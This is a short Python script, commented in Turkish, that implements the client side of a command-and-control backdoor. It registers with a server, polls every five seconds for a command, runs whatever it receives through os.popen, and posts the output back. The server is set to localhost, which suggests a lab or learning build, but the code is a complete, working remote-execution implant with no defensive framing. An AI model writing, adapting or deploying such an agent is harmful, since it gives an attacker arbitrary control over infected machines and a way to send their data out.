import requests
import time
import os

SERVER_URL = "http://127.0.0.1:8000"
CLIENT_ID = "unknown_client"

# Sunucuya kendini kaydet
def register():
    try:
        response = requests.post(f"{SERVER_URL}/register/", params={"client_id": CLIENT_ID})
        if response.status_code == 200:
            print("[+] Registered successfully")
    except Exception as e:
        print(f"[-] Error registering: {e}")

# Sunucudan komut al ve çalıştır
def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/clients/")
        if response.status_code == 200:
            clients = response.json()
            command = clients.get(CLIENT_ID, {}).get("command")
            if command:
                print(f"[+] Received command: {command}")
                output = os.popen(command).read()
                send_response(output)
    except Exception as e:
        print(f"[-] Error fetching command: {e}")

# Komut çıktısını sunucuya gönder
def send_response(output):
    try:
        response = requests.post(
            f"{SERVER_URL}/response/",
            json={"client_id": CLIENT_ID, "response": output}
        )
        if response.status_code == 200:
            print("[+] Response sent successfully")
    except Exception as e:
        print(f"[-] Error sending response: {e}")

# Ana döngü
if __name__ == "__main__":
    register()
    while True:
        get_command()
        time.sleep(5)
